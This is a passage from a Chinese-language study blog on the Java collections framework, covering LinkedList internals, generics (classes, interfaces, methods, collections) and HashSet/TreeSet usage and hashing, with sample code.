<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* Appends the specified element to the end of this list.</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">* &lt;p&gt;This method is equivalent to &#123;<span class="doctag">@link</span> #addLast&#125;.</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> e element to be appended to this list</span></span><br><span class="line"><span class="comment">* <span class="doctag">@return</span> &#123;<span class="doctag">@code</span> true&#125; (as specified by &#123;<span class="doctag">@link</span> Collection#add&#125;)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">add</span><span class="params">(E e)</span> </span>&#123;</span><br><span class="line">    linkLast(e);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>主要通过<code>linLast</code>实现，所以看看<code>linkLast</code>，就是在<strong>尾部添加元素</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* Links e as last element.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">linkLast</span><span class="params">(E e)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">final</span> Node&lt;E&gt; l = last;</span><br><span class="line">    <span class="keyword">final</span> Node&lt;E&gt; newNode = <span class="keyword">new</span> Node&lt;&gt;(l, e, <span class="keyword">null</span>);</span><br><span class="line">    last = newNode;</span><br><span class="line">    <span class="keyword">if</span> (l == <span class="keyword">null</span>)</span><br><span class="line">        first = newNode;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        l.next = newNode;</span><br><span class="line">    size++;</span><br><span class="line">    modCount++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 因为用到 Node，所以也看下Node</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Node</span>&lt;<span class="title">E</span>&gt; </span>&#123;</span><br><span class="line">    E item;  <span class="comment">// 当前元素，实际数据</span></span><br><span class="line">    Node&lt;E&gt; next;  <span class="comment">// 下一个节点</span></span><br><span class="line">    Node&lt;E&gt; prev;  <span class="comment">// 前一个节点</span></span><br><span class="line">    </span><br><span class="line">    Node(Node&lt;E&gt; prev, E element, Node&lt;E&gt; next) &#123;</span><br><span class="line">        <span class="keyword">this</span>.item = element;</span><br><span class="line">        <span class="keyword">this</span>.next = next;</span><br><span class="line">        <span class="keyword">this</span>.prev = prev;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="15-ArrayList与LinkedList区别"><a href="#15-ArrayList与LinkedList区别" class="headerlink" title="15 ArrayList与LinkedList区别"></a>15 ArrayList与LinkedList区别</h2><p>本质就是数组和链表的区别。</p>
<p>数组：必须开辟连续空间，查询快，增删慢。</p>
<p>链表：不用开辟连续空间，查询慢，增删快。</p>
<h2 id="16-泛型概述"><a href="#16-泛型概述" class="headerlink" title="16 泛型概述"></a>16 泛型概述</h2><p>有点类似于C++的模板</p>
<h3 id="一、概念-1"><a href="#一、概念-1" class="headerlink" title="一、概念"></a>一、概念</h3><p>Java泛型是JDK1.5中引入的新特性，其本质是参数化类型，把类型作为参数传递。</p>
<h3 id="二、常见形式"><a href="#二、常见形式" class="headerlink" title="二、常见形式"></a>二、常见形式</h3><p>泛型类、泛型接口、泛型方法。</p>
<h3 id="三、语法"><a href="#三、语法" class="headerlink" title="三、语法"></a>三、语法</h3><p><code>&lt;T,...&gt;</code> T表示类型占位符，表示一种引用类型</p>
<h3 id="四、好处"><a href="#四、好处" class="headerlink" title="四、好处"></a>四、好处</h3><p>（1）提高代码重用性</p>
<p>（2）防止类型转换异常，提高代码安全性</p>
<h2 id="17-泛型类"><a href="#17-泛型类" class="headerlink" title="17 泛型类"></a>17 泛型类</h2><h3 id="一、编写泛型类"><a href="#一、编写泛型类" class="headerlink" title="一、编写泛型类"></a>一、编写泛型类</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 语法：类名&lt;T&gt;</span></span><br><span class="line"><span class="comment"> * T是类型占位符，表示一种引用类型（不能是基本类型），如果编写多个，可使用逗号隔开</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyGeneric</span>&lt;<span class="title">T</span>&gt; </span>&#123;</span><br><span class="line">    <span class="comment">// 创建变量</span></span><br><span class="line">    T t;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 泛型作为方法的参数</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">show</span><span class="params">(T t)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// T t1 = new T(); </span></span><br><span class="line">        System.out.println(t);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 泛型作为返回值</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> T <span class="title">getT</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> t;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="二、注意"><a href="#二、注意" class="headerlink" title="二、注意"></a>二、注意</h3><p>使用泛型类时，可以创建变量，但不能进行实例化。</p>
<p>原因：<code>T</code> 代表一种数据类型，但这种类型是不确定的，那它的构造方法就不一定能用，比如万一它的构造方法是私有的。</p>
<h3 id="三、使用泛型类"><a href="#三、使用泛型类" class="headerlink" title="三、使用泛型类"></a>三、使用泛型类</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestGeneric</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 使用泛型类创建对象</span></span><br><span class="line">        MyGeneric&lt;String&gt; myGeneric = <span class="keyword">new</span> MyGeneric&lt;&gt;();  <span class="comment">// 后面尖括号中的String可写可不写</span></span><br><span class="line">        myGeneric.t = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">        myGeneric.show(<span class="string">&quot;大家好&quot;</span>);</span><br><span class="line">        System.out.println(myGeneric.getT());</span><br><span class="line"></span><br><span class="line">        MyGeneric&lt;Integer&gt; myGeneric1 = <span class="keyword">new</span> MyGeneric&lt;&gt;();</span><br><span class="line">        myGeneric1.t = <span class="number">100</span>;</span><br><span class="line">        myGeneric1.show(<span class="number">200</span>);</span><br><span class="line">        Integer integer = myGeneric1.getT();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="18-泛型接口"><a href="#18-泛型接口" class="headerlink" title="18 泛型接口"></a>18 泛型接口</h2><h3 id="一、new一个interface"><a href="#一、new一个interface" class="headerlink" title="一、new一个interface"></a>一、new一个interface</h3><p>新家接口文件的方法</p>
<p><img src="/2021/12/20/Java%E9%9B%86%E5%90%88%E6%A1%86%E6%9E%B6/image-20211223163014162.png" alt="image-20211223163014162"></p>
<p><img src="/2021/12/20/Java%E9%9B%86%E5%90%88%E6%A1%86%E6%9E%B6/image-20211223163026794.png" alt="image-20211223163026794"></p>
<h3 id="二、编写接口"><a href="#二、编写接口" class="headerlink" title="二、编写接口"></a>二、编写接口</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 语法：接口名&lt;T&gt;</span></span><br><span class="line"><span class="comment"> * 接口里可以包含抽象方法和静态常量</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">MyInterface</span>&lt;<span class="title">T</span>&gt; </span>&#123;</span><br><span class="line">    String name = <span class="string">&quot;张三&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 添加一个抽象方法</span></span><br><span class="line">    <span class="function">T <span class="title">server</span><span class="params">(T t)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="三、注意"><a href="#三、注意" class="headerlink" title="三、注意"></a>三、注意</h3><p><strong>不能创建泛型静态常量</strong>，因为静态常量要求声明时进行初始化，但是又不知道T的类型，因此无法给它初始化。</p>
<h3 id="四、接口的使用"><a href="#四、接口的使用" class="headerlink" title="四、接口的使用"></a>四、接口的使用</h3><h5 id="A-实现接口时明确类型"><a href="#A-实现接口时明确类型" class="headerlink" title="A. 实现接口时明确类型"></a>A. 实现接口时明确类型</h5><p>（1）说明</p>
<p><strong>由于接口是不能实例化的，所以我们要添加一个实现类。</strong>在写实现类的时候给明确的引用类型。然后实现即可。</p>
<p><img src="/2021/12/20/Java%E9%9B%86%E5%90%88%E6%A1%86%E6%9E%B6/image-20211223163851262.png" alt="image-20211223163851262"></p>
<p><img src="/2021/12/20/Java%E9%9B%86%E5%90%88%E6%A1%86%E6%9E%B6/image-20211223164032828.png" alt="image-20211223164032828"></p>
<p><img src="/2021/12/20/Java%E9%9B%86%E5%90%88%E6%A1%86%E6%9E%B6/image-20211223164148318.png" alt="image-20211223164148318"></p>
<p>（2）编写</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyInterfaceImpl</span> <span class="keyword">implements</span> <span class="title">MyInterface</span>&lt;<span class="title">String</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">server</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">        System.out.println(s);</span><br><span class="line">        <span class="keyword">return</span> s;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>（3）使用接口</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">MyInterfaceImpl impl = <span class="keyword">new</span> MyInterfaceImpl();</span><br><span class="line">impl.server(<span class="string">&quot;xxxxxx&quot;</span>);</span><br></pre></td></tr></table></figure>
<h5 id="B-在实现时不确定的类型"><a href="#B-在实现时不确定的类型" class="headerlink" title="B. 在实现时不确定的类型"></a>B. 在实现时不确定的类型</h5><p>（1）编写</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyInterfaceImpl2</span>&lt;<span class="title">T</span>&gt; <span class="keyword">implements</span> <span class="title">MyInterface</span>&lt;<span class="title">T</span>&gt; </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> T <span class="title">server</span><span class="params">(T t)</span> </span>&#123;</span><br><span class="line">        System.out.println(t);</span><br><span class="line">        <span class="keyword">return</span> t;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>（2）使用</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">MyInterfaceImpl2&lt;Integer&gt; impl2 = <span class="keyword">new</span> MyInterfaceImpl2&lt;&gt;();</span><br><span class="line">impl2.server(<span class="number">100</span>);</span><br></pre></td></tr></table></figure>
<h2 id="19-泛型方法"><a href="#19-泛型方法" class="headerlink" title="19 泛型方法"></a>19 泛型方法</h2><p>参考《Java核心技术卷I》P313</p>
<p>泛型方法可以定义在普通类中，也可以定义在泛型类中。当调用一个泛型方法时，在方法名前的尖括号中放入具体的类型。</p>
<font face="楷体">注意：大多数情况，不标记具体类型，编译器也可以做出正确的推断，但是最好还是带上，避免不必要的麻烦。</font>

<p>（1）定义一个带有类型参数的简单泛型方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 语法：&lt;T&gt; 返回值类型</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyGenericMethod</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 泛型方法</span></span><br><span class="line">    <span class="keyword">public</span> &lt;T&gt; <span class="function">T <span class="title">show</span><span class="params">(T t)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> t;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>（2）使用</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">MyGenericMethod myGenericMethod = <span class="keyword">new</span> MyGenericMethod();</span><br><span class="line">String m = myGenericMethod.&lt;String&gt;show(<span class="string">&quot;azhe&quot;</span>);</span><br><span class="line">System.out.println(m);</span><br></pre></td></tr></table></figure>
<h2 id="20-泛型集合"><a href="#20-泛型集合" class="headerlink" title="20 泛型集合"></a>20 泛型集合</h2><h3 id="一、概念-2"><a href="#一、概念-2" class="headerlink" title="一、概念"></a>一、概念</h3><p>参数化类型、类型安全的集合，强制集合元素的类型必须一致。</p>
<h3 id="二、-特点"><a href="#二、-特点" class="headerlink" title="二、 特点"></a>二、 特点</h3><p>（1）编译时即可检查，而非运行时抛出异常</p>
<p>（2）访问时，不必类型转换（拆箱）</p>
<p>（3）不同泛型之间引用不能相互赋值，泛型不存在多态</p>
<h3 id="三、关于类型转换的问题说明"><a href="#三、关于类型转换的问题说明" class="headerlink" title="三、关于类型转换的问题说明"></a>三、关于类型转换的问题说明</h3><p>样例程序如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo3</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        ArrayList arrayList = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        arrayList.add(<span class="string">&quot;xxxx&quot;</span>);</span><br><span class="line">        arrayList.add(<span class="string">&quot;xxxx&quot;</span>);</span><br><span class="line">        arrayList.add(<span class="number">100</span>);</span><br><span class="line">        arrayList.add(<span class="number">200</span>);</span><br><span class="line">        <span class="keyword">for</span> (Object o : arrayList) &#123;</span><br><span class="line">            System.out.println(o);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在上述代码中，虽然我们往arrayList中存入两种类型的数据，但是在遍历时因为用的Object，所以一切正常。但是如果遍历时我们定义一个String临时变量存放元素数据，就会产生异常了。</p>
<p><img src="/2021/12/20/Java%E9%9B%86%E5%90%88%E6%A1%86%E6%9E%B6/image-20211224153818333.png" alt="image-20211224153818333"></p>
<p><strong>泛型集合</strong>就是可以解决这种问题。</p>
<h3 id="四、泛型集合在创建集合对象时指定类型"><a href="#四、泛型集合在创建集合对象时指定类型" class="headerlink" title="四、泛型集合在创建集合对象时指定类型"></a>四、泛型集合在创建集合对象时指定类型</h3><p>在创建集合对象时指定类型，比如这里给的String，如果我们添加非String类型的元素就会报错了。</p>
<p>另外，也可以注意到，我们在遍历时可以直接用具体类型String而不再是Object，当然用Object遍历也是可以的。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo3</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        ArrayList&lt;String&gt; arrayList = <span class="keyword">new</span> ArrayList&lt;&gt;();  <span class="comment">// 在创建集合对象时指定类型</span></span><br><span class="line">        arrayList.add(<span class="string">&quot;xxxx&quot;</span>);</span><br><span class="line">        arrayList.add(<span class="string">&quot;xxxx&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (String s : arrayList) &#123;</span><br><span class="line">            System.out.println(s);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="21-Set集合"><a href="#21-Set集合" class="headerlink" title="21 Set集合"></a>21 Set集合</h2><p> Set方法和Collection一模一样</p>
<h2 id="22-Set接口使用"><a href="#22-Set接口使用" class="headerlink" title="22 Set接口使用"></a>22 Set接口使用</h2><h3 id="一、HashSet"><a href="#一、HashSet" class="headerlink" title="一、HashSet"></a>一、HashSet</h3><p>（1）基于HashCode实现元素不重复</p>
<p>（2）当存入元素的HashCode相同，会调用equals确认，若结果为true，则拒绝后者存入</p>
<h3 id="二、TreeSet（红黑树结构）"><a href="#二、TreeSet（红黑树结构）" class="headerlink" title="二、TreeSet（红黑树结构）"></a>二、TreeSet（红黑树结构）</h3><p>（1）基于排列顺序实现元素不重复</p>
<p>（2）实现了<code>SortedSet</code>接口，对集合元素自动排序</p>
<p>（3）元素对象的类型必须实现<code>Comparable</code>接口，指定排序规则</p>
<p>（4）通过<code>CompareTo</code>方法确定是否为重复元素</p>
<h3 id="三、使用示例"><a href="#三、使用示例" class="headerlink" title="三、使用示例"></a>三、使用示例</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Iterator;</span><br><span class="line"><span class="keyword">import</span> java.util.Set;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 创建集合</span></span><br><span class="line">        Set&lt;String&gt; set = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line">        <span class="comment">// 添加数据</span></span><br><span class="line">        set.add(<span class="string">&quot;苹果&quot;</span>);</span><br><span class="line">        set.add(<span class="string">&quot;华为&quot;</span>);</span><br><span class="line">        set.add(<span class="string">&quot;小米&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;数据个数：&quot;</span> + set.size());</span><br><span class="line">        System.out.println(set.toString());</span><br><span class="line">        <span class="comment">// 删除数据</span></span><br><span class="line"><span class="comment">//        set.remove(&quot;小米&quot;);</span></span><br><span class="line"><span class="comment">//        System.out.println(set.toString());</span></span><br><span class="line">        <span class="comment">// 遍历</span></span><br><span class="line">        System.out.println(<span class="string">&quot;——————————foreach——————————&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (String s : set) &#123;</span><br><span class="line">            System.out.println(s);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 迭代器遍历</span></span><br><span class="line">        System.out.println(<span class="string">&quot;——————————迭代器——————————&quot;</span>);</span><br><span class="line">        Iterator&lt;String&gt; it = set.iterator();</span><br><span class="line">        <span class="keyword">while</span> (it.hasNext()) &#123;</span><br><span class="line">            System.out.println(it.next());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 判断</span></span><br><span class="line">        System.out.println(set.contains(<span class="string">&quot;华为&quot;</span>));</span><br><span class="line">        System.out.println(set.isEmpty());</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="23-HashSet实现类的使用（1）"><a href="#23-HashSet实现类的使用（1）" class="headerlink" title="23 HashSet实现类的使用（1）"></a>23 HashSet实现类的使用（1）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Iterator;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo2</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 新建集合</span></span><br><span class="line">        HashSet&lt;String&gt; hashSet = <span class="keyword">new</span> HashSet&lt;String&gt;();</span><br><span class="line">        <span class="comment">// 添加数据</span></span><br><span class="line">        hashSet.add(<span class="string">&quot;周杰伦&quot;</span>);</span><br><span class="line">        hashSet.add(<span class="string">&quot;张国荣&quot;</span>);</span><br><span class="line">        hashSet.add(<span class="string">&quot;张学友&quot;</span>);</span><br><span class="line">        hashSet.add(<span class="string">&quot;胡歌&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;数据个数&quot;</span> + hashSet.size());</span><br><span class="line">        System.out.println(hashSet.toString());</span><br><span class="line">        <span class="comment">// 删除数据</span></span><br><span class="line">        hashSet.remove(<span class="string">&quot;胡歌&quot;</span>);</span><br><span class="line">        System.out.println(hashSet.toString());</span><br><span class="line">        <span class="comment">// foreach</span></span><br><span class="line">        System.out.println(<span class="string">&quot;-----foreach-----&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (String s : hashSet) &#123;</span><br><span class="line">            System.out.println(s);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 迭代器</span></span><br><span class="line">        System.out.println(<span class="string">&quot;-----迭代器-----&quot;</span>);</span><br><span class="line">        Iterator&lt;String&gt; it = hashSet.iterator();</span><br><span class="line">        <span class="keyword">while</span> (it.hasNext()) &#123;</span><br><span class="line">            System.out.println(it.next());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 判断</span></span><br><span class="line">        System.out.println(hashSet.contains(<span class="string">&quot;周杰伦&quot;</span>));</span><br><span class="line">        System.out.println(hashSet.isEmpty());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="24-HashSet实现类的使用（2）"><a href="#24-HashSet实现类的使用（2）" class="headerlink" title="24 HashSet实现类的使用（2）"></a>24 HashSet实现类的使用（2）</h2><h3 id="一、Person类"><a href="#一、Person类" class="headerlink" title="一、Person类"></a>一、Person类</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">(String name, <span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Person&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, age=&quot;</span> + age +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="二、HashSet使用"><a href="#二、HashSet使用" class="headerlink" title="二、HashSet使用"></a>二、HashSet使用</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 存储结构：Hash表（数组+链表+红黑树）</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo3</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 创建结合</span></span><br><span class="line">        HashSet&lt;Person&gt; persons = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line">        <span class="comment">// 添加数据</span></span><br><span class="line">        Person p1 = <span class="keyword">new</span> Person(<span class="string">&quot;人1&quot;</span>,<span class="number">18</span>);</span><br><span class="line">        Person p2 = <span class="keyword">new</span> Person(<span class="string">&quot;人2&quot;</span>,<span class="number">29</span>);</span><br><span class="line">        Person p3 = <span class="keyword">new</span> Person(<span class="string">&quot;人3&quot;</span>,<span class="number">20</span>);</span><br><span class="line">        persons.add(p1);</span><br><span class="line">        persons.add(p2);</span><br><span class="line">        persons.add(p3);</span><br><span class="line">        persons.add(<span class="keyword">new</span> Person(<span class="string">&quot;人2&quot;</span>, <span class="number">29</span>)); </span><br><span class="line">        System.out.println(<span class="string">&quot;元素个数：&quot;</span> + persons.size());</span><br><span class="line">        System.out.println(persons.toString());</span><br><span class="line">        <span class="comment">// 删除操作</span></span><br><span class="line">        persons.remove(p1);</span><br><span class="line">        System.out.println(persons.toString());</span><br><span class="line">        <span class="comment">// 遍历</span></span><br><span class="line">        System.out.println(<span class="string">&quot;-----foreach-----&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (Person p : persons) &#123;</span><br><span class="line">            System.out.println(p.toString());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 迭代器</span></span><br><span class="line">        System.out.println(<span class="string">&quot;-----迭代器-----&quot;</span>);</span><br><span class="line">        Iterator&lt;Person&gt; it = persons.iterator();</span><br><span class="line">        <span class="keyword">while</span> (it.hasNext()) &#123;</span><br><span class="line">            System.out.println(it.next());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 判断</span></span><br><span class="line">        System.out.println(persons.contains(p1));</span><br><span class="line">        System.out.println(persons.isEmpty());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="一、注意-1"><a href="#一、注意-1" class="headerlink" title="一、注意"></a>一、注意</h3><p>这里的<code>persons.add(new Person(&quot;人2&quot;, 29));</code>是可以成功添加元素的。因为这里new出来的对象和p2的地址是不一样的，如果添加p2就添加不进去。如果想实现名字和年龄相同时不允许加入，则需要重写<code>hashCode()</code>。这里需要了解HashSet的存储方式。</p>
<h2 id="25-HashSet存储方式"><a href="#25-HashSet存储方式" class="headerlink" title="25 HashSet存储方式"></a>25 HashSet存储方式</h2><h3 id="一、存储结构"><a href="#一、存储结构" class="headerlink" title="一、存储结构"></a>一、存储结构</h3><p>Hash表（数组+链表+红黑树）</p>
<h3 id="二、存储过程"><a href="#二、存储过程" class="headerlink" title="二、存储过程"></a>二、存储过程</h3><p>（1）根据hashcode，计算保存的位置。如果此位置为空，直接保存；不为空，则（2）</p>
<p>（2）再执行equals，如果equals为true，则认为重复；否则，形成链表</p>
<h3 id="三、重写hashCode"><a href="#三、重写hashCode" class="headerlink" title="三、重写hashCode()"></a>三、重写<code>hashCode()</code></h3><p>在Person类中，重写<code>hashCode</code>，方法同前文提到的重写<code>equals</code></p>
<p><img src="/2021/12/20/Java%E9%9B%86%E5%90%88%E6%A1%86%E6%9E%B6/image-20211228153257768.png" alt="image-20211228153257768"></p>
<p>自动生成，无需修改。</p>
<h2 id="26-HashSet补充"><a href="#26-HashSet补充" class="headerlink" title="26 HashSet补充"></a>26 HashSet补充</h2><h3 id="一、重写的hashCode中，这个31是什么？"><a href="#一、重写的hashCode中，这个31是什么？" class="headerlink" title="一、重写的hashCode中，这个31是什么？"></a>一、重写的<code>hashCode</code>中，这个31是什么？</h3><p><img src="/2021/12/20/Java%E9%9B%86%E5%90%88%E6%A1%86%E6%9E%B6/image-20211228153921624.png" alt="image-20211228153921624"></p>
<p>（1）31是一个质数，用质数做运算，可以尽可能减少散列冲突。（也就是说通过hashCode计算出来的位置尽量不一样）</p>
<p>（2）<code>31*i=(i&lt;&lt;5)-i</code>，乘法操作可以换成位运算，提高执行的效率。</p>
